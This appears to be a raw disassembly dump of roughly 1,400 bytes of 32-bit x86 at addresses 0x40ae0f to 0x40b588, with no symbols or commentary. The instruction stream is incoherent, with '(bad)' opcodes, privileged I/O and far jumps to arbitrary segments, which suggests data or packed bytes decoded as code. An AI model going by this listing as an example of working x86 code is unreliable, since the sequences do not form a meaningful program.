  40ae0f:	push   0x3e
  40ae11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae12:	xchg   ebp,eax
  40ae13:	mov    al,ds:0x95e12e49
  40ae18:	div    BYTE PTR [edi]
  40ae1a:	xchg   BYTE PTR [edi+0x6],dh
  40ae1d:	mov    esp,0x39db869d
  40ae22:	mov    DWORD PTR [esi+0x1d6370f9],edi
  40ae28:	dec    eax
  40ae29:	cmp    al,0x87
  40ae2b:	hlt    
  40ae2c:	mov    ch,0xdb
  40ae2e:	outs   dx,DWORD PTR ds:[esi]
  40ae2f:	xor    ebp,edx
  40ae31:	pop    edi
  40ae32:	xchg   DWORD PTR [edi-0x5c],ebx
  40ae35:	push   edi
  40ae36:	jae    0x40aea2
  40ae38:	xor    al,0x51
  40ae3a:	mov    ah,0x80
  40ae3c:	bound  esp,QWORD PTR [esi]
  40ae3e:	pop    ds
  40ae3f:	jb     0x40ae4c
  40ae41:	fild   WORD PTR [eax]
  40ae43:	ret    
  40ae44:	outs   dx,BYTE PTR ds:[esi]
  40ae45:	cld    
  40ae46:	adc    ch,0x7a
  40ae49:	xor    ebx,0xffffffd4
  40ae4c:	pop    ebp
  40ae4d:	nop
  40ae4e:	leave  
  40ae4f:	mov    dh,0xe5
  40ae51:	in     eax,0xc1
  40ae53:	jae    0x40adda
  40ae55:	hlt    
  40ae56:	je     0x40ae50
  40ae58:	cli    
  40ae59:	div    cl
  40ae5b:	outs   dx,DWORD PTR ds:[esi]
  40ae5c:	xchg   edi,eax
  40ae5d:	sub    eax,0xe938dbfd
  40ae62:	repnz add DWORD PTR [ecx],esi
  40ae65:	sub    al,0x12
  40ae67:	dec    esp
  40ae68:	test   al,0xa7
  40ae6a:	fisttp QWORD PTR [ebp-0x28f99e05]
  40ae70:	mov    ds:0x8ad5270b,al
  40ae75:	in     eax,dx
  40ae76:	aad    0x9b
  40ae78:	icebp  
  40ae79:	sbb    DWORD PTR [ecx-0x39],ecx
  40ae7c:	push   ebp
  40ae7d:	jbe    0x40ae2c
  40ae7f:	jnp    0x40ae10
  40ae81:	pop    ecx
  40ae82:	jb     0x40aefa
  40ae84:	fs sub eax,0xdeb56485
  40ae8a:	lds    ecx,FWORD PTR [edi+0x34]
  40ae8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae8e:	sub    bh,BYTE PTR [esi-0xc]
  40ae91:	repnz mov edi,0xc61da3d
  40ae97:	or     DWORD PTR [ebp+0x72],esi
  40ae9a:	loopne 0x40aef5
  40ae9c:	bound  esi,QWORD PTR [ebp-0x1a]
  40ae9f:	dec    ecx
  40aea0:	add    BYTE PTR fs:[edx],ch
  40aea3:	or     DWORD PTR [ebx+0x43],eax
  40aea6:	int3   
  40aea7:	pushf  
  40aea8:	mov    edi,0x15c6276b
  40aead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeae:	in     al,dx
  40aeaf:	pop    ss
  40aeb0:	mov    esi,0x53eec471
  40aeb5:	aaa    
  40aeb6:	clc    
  40aeb7:	mov    esp,0xc0bac04f
  40aebc:	repz and bl,BYTE PTR [ebx+0x1d]
  40aec0:	fsub   DWORD PTR [edx]
  40aec2:	sti    
  40aec3:	iret   
  40aec4:	jmp    0x3d3d:0x518d120a
  40aecb:	jo     0x40aee5
  40aecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aece:	pop    eax
  40aecf:	cmpps  xmm2,xmm5,0x99
  40aed3:	out    0x8c,al
  40aed5:	push   0xa6a0fd17
  40aeda:	and    DWORD PTR [edi],eax
  40aedc:	mov    ch,0xd3
  40aede:	pushf  
  40aedf:	rcr    DWORD PTR [edx+esi*1+0x104e83f8],1
  40aee6:	jge    0x40aea2
  40aee8:	bound  ebp,QWORD PTR [edi]
  40aeea:	inc    ecx
  40aeeb:	jl     0x40aeb0
  40aeed:	cmp    ecx,0x68bc9979
  40aef3:	lahf   
  40aef4:	cmp    BYTE PTR [esi+0xec2547f],bl
  40aefa:	add    al,0x4e
  40aefc:	push   0xffffffd8
  40aefe:	clc    
  40aeff:	push   0xd048b342
  40af04:	cmc    
  40af05:	scas   al,BYTE PTR es:[edi]
  40af06:	sub    al,0x33
  40af08:	test   BYTE PTR [ecx+0x1],bh
  40af0b:	push   0x8e7d98a2
  40af10:	enter  0x9493,0x29
  40af14:	jb     0x40af2a
  40af16:	jno    0x40af6f
  40af18:	pop    ds
  40af19:	adc    al,0x21
  40af1b:	scas   al,BYTE PTR es:[edi]
  40af1c:	inc    edx
  40af1d:	xlat   BYTE PTR ds:[ebx]
  40af1e:	mov    ds:0xc4fc1eb5,eax
  40af23:	jae    0x40aef7
  40af25:	push   esp
  40af26:	cwde   
  40af27:	sub    eax,0x1eb85349
  40af2c:	push   cs
  40af2d:	lods   al,BYTE PTR ds:[esi]
  40af2e:	inc    bx
  40af30:	popa   
  40af31:	hlt    
  40af32:	jae    0x40af1f
  40af34:	test   al,0x15
  40af36:	gs enter 0xa51d,0x1a
  40af3b:	fucom  st(2)
  40af3d:	mov    WORD PTR [ebp-0x6],gs
  40af40:	int    0xb0
  40af42:	fld    QWORD PTR [ebx+ebx*8]
  40af45:	sub    al,0xfe
  40af47:	xor    al,0x0
  40af49:	std    
  40af4a:	pop    eax
  40af4b:	inc    ebx
  40af4c:	xchg   BYTE PTR [esi+eax*2],cl
  40af4f:	aad    0x64
  40af51:	fidiv  WORD PTR [edx+0x3f46dd10]
  40af57:	shl    cl,1
  40af59:	dec    ebp
  40af5a:	sar    BYTE PTR [eax+eiz*1-0x351d407],cl
  40af61:	fsub   DWORD PTR [esi]
  40af63:	sub    esp,0x187bba5
  40af69:	pop    ss
  40af6a:	jbe    0x40af1a
  40af6c:	es icebp 
  40af6e:	adc    DWORD PTR [edx+eiz*2-0x2693579a],ebx
  40af75:	loope  0x40afb3
  40af77:	fucomip st,st(1)
  40af79:	test   eax,0x2b5bca27
  40af7e:	push   esp
  40af7f:	jmp    0x40afd9
  40af81:	mov    dh,0xb0
  40af83:	inc    edx
  40af84:	or     eax,0xf9414df9
  40af89:	or     al,BYTE PTR [eax-0x6e]
  40af8c:	mov    cl,0xcb
  40af8e:	(bad)  
  40af8f:	lock cmp DWORD PTR [edi+0x4bc69dd3],ebx
  40af96:	inc    ebp
  40af97:	xchg   esp,eax
  40af98:	addr16 sub al,0xfd
  40af9b:	add    DWORD PTR [ebx+edx*1],edx
  40af9e:	dec    DWORD PTR [ebp-0x31]
  40afa1:	mov    cl,0x84
  40afa3:	push   edx
  40afa4:	rcr    DWORD PTR [ebx-0x6084c1a8],cl
  40afaa:	jecxz  0x40afda
  40afac:	ret    
  40afad:	in     eax,dx
  40afae:	cmp    al,0x75
  40afb0:	ins    BYTE PTR es:[edi],dx
  40afb1:	jecxz  0x40afe9
  40afb3:	cmp    ah,dh
  40afb5:	mov    ebp,0x9bb1c766
  40afba:	pop    edx
  40afbb:	out    dx,al
  40afbc:	das    
  40afbd:	cli    
  40afbe:	add    BYTE PTR [eax],ah
  40afc0:	stos   DWORD PTR es:[edi],eax
  40afc1:	sbb    dl,dl
  40afc3:	and    al,0x45
  40afc5:	push   esp
  40afc6:	shl    BYTE PTR [esp+ecx*8+0x6be2ebf5],1
  40afcd:	data16 repnz fisubr WORD PTR [edi+0x1219c8a3]
  40afd5:	fs jmp 0x7b0f:0x94b36474
  40afdd:	stc    
  40afde:	lds    ecx,FWORD PTR [ebp+esi*2-0x9648f66]
  40afe5:	adc    BYTE PTR [ebp-0x6],al
  40afe8:	adc    BYTE PTR [esi+0x70497a9f],cl
  40afee:	out    0xd3,al
  40aff0:	pop    DWORD PTR [ebx]
  40aff2:	ins    BYTE PTR es:[edi],dx
  40aff3:	popf   
  40aff4:	jnp    0x40b03c
  40aff6:	loop   0x40b060
  40aff8:	sar    DWORD PTR [ecx+0x1c9625fa],1
  40affe:	cwde   
  40afff:	sbb    bl,ah
  40b001:	xchg   edx,eax
  40b002:	ret    
  40b003:	push   esi
  40b004:	dec    edx
  40b005:	push   edi
  40b006:	add    ch,BYTE PTR [edx+0x3436906a]
  40b00c:	aam    0xde
  40b00e:	sbb    eax,0xf02b0b8
  40b013:	scas   al,BYTE PTR es:[edi]
  40b014:	scas   al,BYTE PTR es:[edi]
  40b015:	cld    
  40b016:	nop
  40b017:	dec    ecx
  40b018:	nop
  40b019:	pop    es
  40b01a:	out    0x46,eax
  40b01c:	sub    al,0xb8
  40b01e:	fild   DWORD PTR [edi-0x33]
  40b021:	inc    ebx
  40b022:	mov    ch,BYTE PTR [edx+ecx*2-0x7a]
  40b026:	cmp    DWORD PTR [eax-0x3564026b],esp
  40b02c:	xor    ebx,edi
  40b02e:	and    BYTE PTR [eax+0xe],bl
  40b031:	out    dx,eax
  40b032:	push   0xc95002fe
  40b037:	loopne 0x40b02b
  40b039:	cmp    esp,DWORD PTR [edx+0x4b]
  40b03c:	out    dx,eax
  40b03d:	add    al,0xd1
  40b03f:	push   edi
  40b040:	mov    ebp,0xdc3abe8d
  40b045:	ror    DWORD PTR [edi],cl
  40b047:	enter  0xce7e,0x29
  40b04b:	jl     0x40b0b8
  40b04d:	push   edi
  40b04e:	mov    ecx,0xf2f2d6a7
  40b053:	xor    al,0xaa
  40b055:	les    esp,FWORD PTR [esi+0x35]
  40b058:	fadd   QWORD PTR [ebx-0x7391f480]
  40b05e:	arpl   WORD PTR [esp+edx*4],dx
  40b061:	mov    bl,0xbc
  40b063:	ins    BYTE PTR es:[edi],dx
  40b064:	push   esi
  40b065:	mov    dl,0xae
  40b067:	sbb    al,0x9c
  40b069:	test   DWORD PTR [ebp+eiz*8+0x1d6c28b7],ebp
  40b070:	scas   eax,DWORD PTR es:[edi]
  40b071:	cmp    cl,BYTE PTR [esi-0x5a178613]
  40b077:	aas    
  40b078:	repnz icebp 
  40b07a:	add    BYTE PTR [ebp-0x53],cl
  40b07d:	sbb    BYTE PTR [ebp+0x28cfeb58],0x8
  40b084:	mov    al,0x5
  40b086:	or     DWORD PTR [esi-0xb],esp
  40b089:	xor    dl,BYTE PTR [ebx+edx*4]
  40b08c:	aad    0x8f
  40b08e:	adc    eax,0xe45deac0
  40b093:	xchg   DWORD PTR [ebx],esp
  40b095:	sbb    al,0x2e
  40b097:	sbb    DWORD PTR [ebx+eiz*1+0x6979ec17],0x45
  40b09f:	inc    esp
  40b0a0:	ret    
  40b0a1:	out    0x13,eax
  40b0a3:	dec    ebx
  40b0a4:	jg     0x40b04e
  40b0a6:	jb     0x40b059
  40b0a8:	and    eax,DWORD PTR [esi-0x6d53c929]
  40b0ae:	mov    ds:0xd913f058,eax
  40b0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0b4:	daa    
  40b0b5:	pop    edi
  40b0b6:	icebp  
  40b0b7:	mov    eax,0xbdc50cc3
  40b0bc:	inc    eax
  40b0bd:	stc    
  40b0be:	es test dh,0xa9
  40b0c2:	xor    al,0xdb
  40b0c4:	mov    ebp,0x16c70ec2
  40b0c9:	mov    al,ds:0x2626eb09
  40b0ce:	pop    ss
  40b0cf:	pop    eax
  40b0d0:	ja     0x40b0a2
  40b0d2:	push   esi
  40b0d3:	jmp    0xea849558
  40b0d8:	shl    DWORD PTR [edi-0x258dae12],0x4f
  40b0df:	ds or  eax,0x34d79179
  40b0e5:	mov    ch,0xb3
  40b0e7:	gs jge 0x40b131
  40b0ea:	adc    edi,ecx
  40b0ec:	bnd jnp 0x40b097
  40b0ef:	data16 mov cl,0x21
  40b0f2:	xchg   ecx,eax
  40b0f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f4:	cmp    bl,bl
  40b0f6:	int    0x3
  40b0f8:	clc    
  40b0f9:	int3   
  40b0fa:	dec    edi
  40b0fb:	hlt    
  40b0fc:	call   0xe9c4fa90
  40b101:	mov    eax,ds:0x16e9bbe8
  40b106:	data16 rcl bl,0x2e
  40b10a:	jbe    0x40b0a0
  40b10c:	mov    ebx,DWORD PTR [ebp+0x56a60109]
  40b112:	push   esp
  40b113:	pushf  
  40b114:	push   ecx
  40b115:	sbb    al,BYTE PTR [ebx+0x1c87367b]
  40b11b:	outs   dx,BYTE PTR ds:[esi]
  40b11c:	cmc    
  40b11d:	inc    eax
  40b11e:	sbb    eax,0xb73e80e6
  40b123:	and    BYTE PTR [ecx],cl
  40b125:	sbb    edi,DWORD PTR [ecx+0x4cd7693]
  40b12b:	and    al,0x67
  40b12d:	dec    ebx
  40b12e:	out    dx,al
  40b12f:	push   ebp
  40b130:	xor    eax,0x3623e88e
  40b135:	adc    al,BYTE PTR [ecx+esi*4-0x1a]
  40b139:	push   ds
  40b13a:	or     eax,0x9bbff9a
  40b13f:	xor    eax,0x7e92e0d2
  40b144:	hlt    
  40b145:	cmp    DWORD PTR [eax],esp
  40b147:	jmp    0x2b2d:0xb56f487d
  40b14e:	call   0x6fdc6507
  40b153:	je     0x40b194
  40b155:	dec    ecx
  40b156:	sahf   
  40b157:	icebp  
  40b158:	in     eax,0xd8
  40b15a:	xchg   BYTE PTR [ecx+eax*8+0x1205c436],ch
  40b161:	aam    0x32
  40b163:	adc    BYTE PTR [ecx],ch
  40b165:	cwde   
  40b166:	data16 xor al,0x98
  40b169:	xchg   DWORD PTR [edx],ecx
  40b16b:	mov    ecx,0x1d361689
  40b170:	inc    edi
  40b171:	and    ebx,DWORD PTR [ecx]
  40b173:	mov    edi,DWORD PTR ds:0xa277a33a
  40b179:	rcr    DWORD PTR [edx+0xe],cl
  40b17c:	dec    eax
  40b17d:	ss aaa 
  40b17f:	fdiv   DWORD PTR [ebp+0x7d65ca60]
  40b185:	jecxz  0x40b15c
  40b187:	aam    0xc6
  40b189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b18a:	fwait
  40b18b:	push   0xfffffff3
  40b18d:	push   ss
  40b18e:	retf   0xa7aa
  40b191:	mov    ebp,0x42e8f9b7
  40b196:	or     al,0x9a
  40b198:	xor    ecx,DWORD PTR [esi-0x61818aed]
  40b19e:	mov    ecx,0x4fa37922
  40b1a3:	and    al,0x4b
  40b1a5:	or     al,0x42
  40b1a7:	jl     0x40b190
  40b1a9:	call   0xadde907a
  40b1ae:	cmp    DWORD PTR ds:0x6b807d26,edi
  40b1b4:	in     al,0xfe
  40b1b6:	jge    0x40b17a
  40b1b8:	retf   
  40b1b9:	arpl   WORD PTR [ecx-0x41],bx
  40b1bc:	mov    edi,0x3b07cf76
  40b1c1:	or     ch,BYTE PTR [ebx+eiz*8+0x41]
  40b1c5:	xor    DWORD PTR [esi+esi*8+0x57],0x9e3f4a9
  40b1cd:	sti    
  40b1ce:	pushf  
  40b1cf:	fild   DWORD PTR [ecx+0x5437b9e6]
  40b1d5:	xor    ecx,DWORD PTR [edi+0x6e]
  40b1d8:	sbb    al,0xac
  40b1da:	pushf  
  40b1db:	push   cs
  40b1dc:	int    0x6d
  40b1de:	xchg   esp,eax
  40b1df:	pop    es
  40b1e0:	xor    bh,BYTE PTR [ecx]
  40b1e2:	in     al,0xb7
  40b1e4:	mov    esp,0xcac9a271
  40b1e9:	mov    dh,0x39
  40b1eb:	jbe    0x40b22b
  40b1ed:	inc    eax
  40b1ee:	addr16 and al,0xbc
  40b1f1:	idiv   BYTE PTR fs:[edi+0x7c]
  40b1f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f6:	mov    al,es:0x47e66a61
  40b1fc:	inc    BYTE PTR [edi+0x37]
  40b1ff:	ds (bad) 
  40b201:	inc    edi
  40b202:	mov    cl,0xde
  40b204:	push   ebx
  40b205:	add    esp,0x1217acf9
  40b20b:	stos   DWORD PTR es:[edi],eax
  40b20c:	aas    
  40b20d:	ret    0xd404
  40b210:	pop    edi
  40b211:	jg     0x40b1ab
  40b213:	mov    dh,0x7b
  40b215:	pop    ds
  40b216:	lss    ebx,FWORD PTR [ebx-0x30]
  40b21a:	call   0xc517:0xf477df7
  40b221:	ret    0x9ff3
  40b224:	mov    ecx,0x48154bd2
  40b229:	das    
  40b22a:	arpl   WORD PTR [ecx],bp
  40b22c:	mov    ah,BYTE PTR [esi]
  40b22e:	ret    
  40b22f:	xor    DWORD PTR [edx+0x603413af],edi
  40b235:	mov    ch,0xe0
  40b237:	inc    esi
  40b238:	mov    dh,ah
  40b23a:	xor    esi,ecx
  40b23c:	(bad)  
  40b23d:	cmp    ecx,DWORD PTR [esi]
  40b23f:	xchg   ecx,eax
  40b240:	sub    DWORD PTR [eax+edi*1],edx
  40b243:	push   0x29
  40b245:	sbb    DWORD PTR [edi],0x17
  40b248:	ret    0x65e2
  40b24b:	cmp    DWORD PTR [esi-0x5f307ca5],edi
  40b251:	cmp    al,0x55
  40b253:	shl    edi,1
  40b255:	mov    gs,WORD PTR [esi]
  40b257:	nop
  40b258:	add    DWORD PTR [edi+eax*1],edx
  40b25b:	and    edx,0x2f
  40b25e:	call   0x71040c10
  40b263:	aad    0x84
  40b265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b266:	fistp  DWORD PTR [ebp-0x69]
  40b269:	out    dx,al
  40b26a:	cmp    ah,BYTE PTR ds:0xa65474d1
  40b270:	xlat   BYTE PTR ds:[ebx]
  40b271:	adc    bl,bh
  40b273:	sub    BYTE PTR [ebp+0x3273e4bd],0x36
  40b27a:	outs   dx,DWORD PTR ds:[esi]
  40b27b:	xor    bh,BYTE PTR ds:0x12072d40
  40b281:	xchg   edi,eax
  40b282:	stos   BYTE PTR es:[edi],al
  40b283:	cmp    ah,bh
  40b285:	(bad)  
  40b286:	pop    esi
  40b287:	jp     0x40b218
  40b289:	xor    DWORD PTR [edx],0xe93d9a7
  40b28f:	pop    esi
  40b290:	lods   eax,DWORD PTR ds:[esi]
  40b291:	mov    ebp,0x3c554d3
  40b296:	inc    ebx
  40b297:	(bad)  [ebx+0x51]
  40b29a:	enter  0x8829,0x11
  40b29e:	mov    bh,0x74
  40b2a0:	adc    eax,0x4f1639cd
  40b2a5:	jl     0x40b2e8
  40b2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2a8:	into   
  40b2a9:	push   ds
  40b2aa:	adc    ebp,DWORD PTR [eax+0x1c]
  40b2ad:	lea    edx,[eax+0x56]
  40b2b0:	and    DWORD PTR [edx+edx*2],ebx
  40b2b3:	sbb    eax,0x36eecdcc
  40b2b8:	test   BYTE PTR [edi],al
  40b2ba:	mov    dl,0x38
  40b2bc:	jae    0x40b334
  40b2be:	jns    0x40b305
  40b2c0:	(bad)  
  40b2c1:	gs cld 
  40b2c3:	call   FWORD PTR [eax-0x117ee73a]
  40b2c9:	sbb    BYTE PTR [ebx],al
  40b2cb:	in     eax,0x38
  40b2cd:	js     0x40b2ff
  40b2cf:	fcom   QWORD PTR [ecx-0x6432f998]
  40b2d5:	fadd   QWORD PTR [ebx-0x13]
  40b2d8:	mov    dl,BYTE PTR [ebp-0x7c]
  40b2db:	into   
  40b2dc:	and    eax,0x23890acf
  40b2e1:	cs inc bx
  40b2e4:	test   DWORD PTR [eax+0x5d],0xb5a3a822
  40b2eb:	addr16 inc esi
  40b2ed:	dec    esi
  40b2ee:	bound  esi,QWORD PTR [esi+0xaa6454]
  40b2f4:	out    0xd2,al
  40b2f6:	dec    esp
  40b2f7:	test   DWORD PTR [esp+eax*1],ebp
  40b2fa:	ds and edi,esp
  40b2fd:	xchg   esi,eax
  40b2fe:	inc    esp
  40b2ff:	mov    ah,0x22
  40b301:	or     bh,BYTE PTR [esi+0x3cbff0f7]
  40b307:	mov    edx,0x924b22b1
  40b30c:	and    eax,0xb564e835
  40b311:	(bad)  
  40b312:	and    DWORD PTR [edx-0x65],ecx
  40b315:	repz sbb eax,ebp
  40b318:	ret    
  40b319:	aad    0x12
  40b31b:	mov    edx,0x6a73c1f5
  40b320:	(bad)  
  40b321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b322:	mov    ch,0x8d
  40b324:	push   es
  40b325:	jb     0x40b382
  40b327:	lar    ebx,cx
  40b32a:	scas   eax,DWORD PTR es:[edi]
  40b32b:	jae    0x40b2f0
  40b32d:	add    eax,0xef1f4f35
  40b332:	sahf   
  40b333:	mov    al,ds:0x375de6ba
  40b338:	jg     0x40b2cd
  40b33a:	cmp    ch,BYTE PTR [eax-0x3d]
  40b33d:	dec    ecx
  40b33e:	pop    esi
  40b33f:	add    eax,0xd3aa8e5b
  40b344:	or     BYTE PTR [eax],0x78
  40b347:	sub    eax,0xaa12ea6c
  40b34c:	or     eax,0x5e872ea
  40b351:	scas   al,BYTE PTR es:[edi]
  40b352:	cmp    BYTE PTR ds:0xeabe56fb,bh
  40b358:	shr    BYTE PTR [edi-0x8],0x68
  40b35c:	rcr    edi,cl
  40b35e:	addr16 push esi
  40b360:	and    esi,esi
  40b362:	aam    0x8e
  40b364:	bound  ebx,QWORD PTR [ecx+0x62]
  40b367:	les    edx,FWORD PTR [ebx-0x14073914]
  40b36d:	mov    ah,0x85
  40b36f:	dec    ebx
  40b370:	fsubr  DWORD PTR [esi-0x6e]
  40b373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b374:	sub    DWORD PTR [esi-0x62ee107],esi
  40b37a:	lea    ebp,[edi+0x1957191c]
  40b380:	clc    
  40b381:	retf   0x3af1
  40b384:	push   edi
  40b385:	(bad)  
  40b386:	mov    eax,0xa477af7f
  40b38b:	leave  
  40b38c:	loope  0x40b3de
  40b38e:	xchg   BYTE PTR [ebp-0x5db11fc],dh
  40b394:	xchg   esi,eax
  40b395:	stc    
  40b396:	inc    esi
  40b397:	add    DWORD PTR [edi-0x481f368f],esp
  40b39d:	xor    ebp,0x7272cc2e
  40b3a3:	inc    ebx
  40b3a4:	fwait
  40b3a5:	repz and DWORD PTR [edi-0x1c],esp
  40b3a9:	shl    BYTE PTR [eax-0x43],0x50
  40b3ad:	cmp    DWORD PTR [ebx],0x3e00143a
  40b3b3:	fs push es
  40b3b5:	hlt    
  40b3b6:	jo     0x40b3a8
  40b3b8:	inc    ebx
  40b3b9:	or     edi,0x6f
  40b3bc:	in     al,dx
  40b3bd:	pop    edi
  40b3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3bf:	mov    dh,0x70
  40b3c1:	(bad)  
  40b3c2:	sbb    edi,ebp
  40b3c4:	data16 or BYTE PTR ds:0xa5294a65,dh
  40b3cb:	mov    ch,0x4e
  40b3cd:	inc    edx
  40b3ce:	cld    
  40b3cf:	int3   
  40b3d0:	xor    eax,0x7f1140f
  40b3d5:	lds    edx,FWORD PTR [ebx]
  40b3d7:	div    BYTE PTR [edi+0x63b7b33a]
  40b3dd:	(bad)
  40b3e1:	mov    bl,0xdb
  40b3e3:	and    bl,BYTE PTR [ecx-0x27]
  40b3e6:	sub    DWORD PTR es:[esi],ecx
  40b3e9:	pop    ds
  40b3ea:	int    0xf8
  40b3ec:	mov    BYTE PTR [ebp+0x2],al
  40b3ef:	mov    ch,0x47
  40b3f1:	add    al,0x73
  40b3f3:	ins    DWORD PTR es:[edi],dx
  40b3f4:	xchg   ebx,eax
  40b3f5:	jmp    0x36896651
  40b3fa:	xchg   esp,eax
  40b3fb:	icebp  
  40b3fc:	pop    es
  40b3fd:	(bad)  
  40b3fe:	clc    
  40b3ff:	ins    DWORD PTR es:[edi],dx
  40b400:	dec    edx
  40b401:	mov    eax,ds:0xf482e580
  40b406:	shl    DWORD PTR [edx-0x1e5323b8],1
  40b40c:	stos   DWORD PTR es:[edi],eax
  40b40d:	into   
  40b40e:	jne    0x40b471
  40b410:	sub    eax,ebx
  40b412:	mov    BYTE PTR [ecx],al
  40b414:	outs   dx,BYTE PTR ds:[esi]
  40b415:	scas   al,BYTE PTR es:[edi]
  40b416:	call   0xd19002b0
  40b41b:	cli    
  40b41c:	mov    al,ds:0x8ef26f7f
  40b421:	shr    BYTE PTR [ebx],cl
  40b423:	in     eax,0xa9
  40b425:	sub    dh,cl
  40b427:	xlat   BYTE PTR ds:[ebx]
  40b428:	scas   al,BYTE PTR es:[edi]
  40b429:	in     al,dx
  40b42a:	ror    ah,1
  40b42c:	addr16 fadd st(1),st
  40b42f:	dec    esp
  40b430:	add    al,0x4b
  40b432:	lods   al,BYTE PTR ds:[esi]
  40b433:	xchg   ecx,eax
  40b434:	loope  0x40b494
  40b436:	and    al,0x17
  40b438:	sub    edx,edx
  40b43a:	jp     0x40b415
  40b43c:	inc    ecx
  40b43d:	addr16 bswap esi
  40b440:	pop    ecx
  40b441:	mov    al,0x6c
  40b443:	lahf   
  40b444:	jae    0x40b4aa
  40b446:	outs   dx,DWORD PTR ds:[esi]
  40b447:	jl     0x40b42c
  40b449:	mov    ds:0x2900c25,al
  40b44e:	mov    ds:0xe3e9431d,al
  40b453:	inc    edi
  40b454:	pusha  
  40b455:	add    BYTE PTR [ecx+0x719a5786],0x88
  40b45c:	pop    edi
  40b45d:	stos   BYTE PTR es:[edi],al
  40b45e:	in     al,0x93
  40b460:	es and eax,0x63955a1b
  40b466:	call   0x23f:0x4e855ca1
  40b46d:	sub    ah,BYTE PTR [ebx-0x1f]
  40b470:	sbb    edi,ebp
  40b472:	inc    esp
  40b473:	mov    ah,0x92
  40b475:	in     al,0xd5
  40b477:	lahf   
  40b478:	mov    al,0x14
  40b47a:	ror    DWORD PTR [ecx-0x7c],cl
  40b47d:	enter  0xc59a,0xa3
  40b481:	inc    ebx
  40b482:	sub    DWORD PTR [ecx],esi
  40b484:	and    esi,DWORD PTR [esp+ecx*2+0x33b3ec5d]
  40b48b:	sub    ebp,DWORD PTR [edx-0x1d]
  40b48e:	shl    edi,1
  40b490:	js     0x40b49a
  40b492:	xchg   DWORD PTR [edi-0x46],edi
  40b495:	sbb    al,0xf2
  40b497:	push   edi
  40b498:	std    
  40b499:	sahf   
  40b49a:	push   0x46
  40b49c:	dec    esi
  40b49d:	test   al,0x39
  40b49f:	pushf  
  40b4a0:	push   ds
  40b4a1:	jge    0x40b4a5
  40b4a3:	pop    edi
  40b4a4:	inc    ecx
  40b4a5:	fnstcw WORD PTR [esi]
  40b4a7:	enter  0xa203,0xb
  40b4ab:	jge    0x40b502
  40b4ad:	fwait
  40b4ae:	stos   BYTE PTR es:[edi],al
  40b4af:	push   cs
  40b4b0:	enter  0x96da,0x69
  40b4b4:	xor    bl,BYTE PTR [ebx]
  40b4b6:	jmp    0x3a99:0x4ff9f35d
  40b4bd:	out    0xae,eax
  40b4bf:	jmp    0x40b523
  40b4c1:	lahf   
  40b4c2:	inc    ecx
  40b4c3:	xchg   edx,eax
  40b4c4:	push   ds
  40b4c5:	bnd jmp 0x40b50a
  40b4c8:	cmp    BYTE PTR [edi-0x29],dl
  40b4cb:	inc    esp
  40b4cc:	call   0xebf1:0x57cc908a
  40b4d3:	inc    ebx
  40b4d4:	xchg   ebx,eax
  40b4d5:	jmp    0xbb968b1
  40b4da:	mov    dl,0x47
  40b4dc:	das    
  40b4dd:	scas   eax,DWORD PTR es:[edi]
  40b4de:	fs xchg ecx,eax
  40b4e0:	jo     0x40b50b
  40b4e2:	es jecxz 0x40b545
  40b4e5:	hlt    
  40b4e6:	or     cl,dh
  40b4e8:	addr16 imul ebp,ebx,0x7f
  40b4ec:	mov    bh,0xb0
  40b4ee:	nop
  40b4ef:	(bad)
  40b4f3:	sar    BYTE PTR [esi],0x74
  40b4f6:	inc    edx
  40b4f7:	mov    DWORD PTR [ebx],edx
  40b4f9:	pop    edi
  40b4fa:	push   eax
  40b4fb:	mov    bl,BYTE PTR [edx+0xa]
  40b4fe:	sbb    DWORD PTR [ebx+0x7b],ecx
  40b501:	loopne 0x40b49a
  40b503:	or     eax,0xb78c6d75
  40b508:	jmp    0x4ad9ade
  40b50d:	nop
  40b50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b50f:	jg     0x40b4a1
  40b511:	js     0x40b4dc
  40b513:	jae    0x40b58b
  40b515:	inc    edx
  40b516:	fadd   DWORD PTR [ebp-0x5d0e2202]
  40b51c:	mov    edi,0x71fed276
  40b521:	cmp    esp,esi
  40b523:	ja     0x40b4db
  40b525:	sahf   
  40b526:	add    esp,edi
  40b528:	in     eax,0xe6
  40b52a:	lock pushf 
  40b52c:	or     edi,ebx
  40b52e:	sti    
  40b52f:	outs   dx,DWORD PTR ds:[esi]
  40b530:	pcmpgtw mm5,QWORD PTR [eax+edx*2]
  40b534:	ror    DWORD PTR [ebx],0x4d
  40b537:	shl    eax,cl
  40b539:	leave  
  40b53a:	jg     0x40b523
  40b53c:	add    al,0x3c
  40b53e:	and    ebx,DWORD PTR [eax+0x843ff7e]
  40b544:	push   0x65
  40b546:	in     al,0xce
  40b548:	popa   
  40b549:	xlat   BYTE PTR ds:[ebx]
  40b54a:	cmp    BYTE PTR ds:0x6587a03b,dl
  40b550:	rol    DWORD PTR [ebp-0x28],cl
  40b553:	fdiv   QWORD PTR [esi]
  40b555:	xchg   ebx,eax
  40b556:	xor    esi,DWORD PTR [edi]
  40b558:	imul   ecx,DWORD PTR [ecx],0x5f8f3308
  40b55e:	and    eax,0xf49d96c4
  40b563:	sub    al,0x9e
  40b565:	aad    0xf9
  40b567:	mov    eax,0xcf5ee05b
  40b56c:	cmp    cl,bl
  40b56e:	push   ss
  40b56f:	fild   DWORD PTR [esi]
  40b571:	test   eax,0x933bcb7c
  40b576:	test   BYTE PTR [esi+0x35],dh
  40b579:	and    al,0x6c
  40b57b:	jp     0x40b56d
  40b57d:	jnp    0x40b5ee
  40b57f:	mov    ecx,0xbe583029
  40b584:	push   es
  40b585:	jl     0x40b585
  40b587:	scas   eax,DWORD PTR es:[edi]
  40b588:	sub    BYTE PTR fs:[edx],0x7e
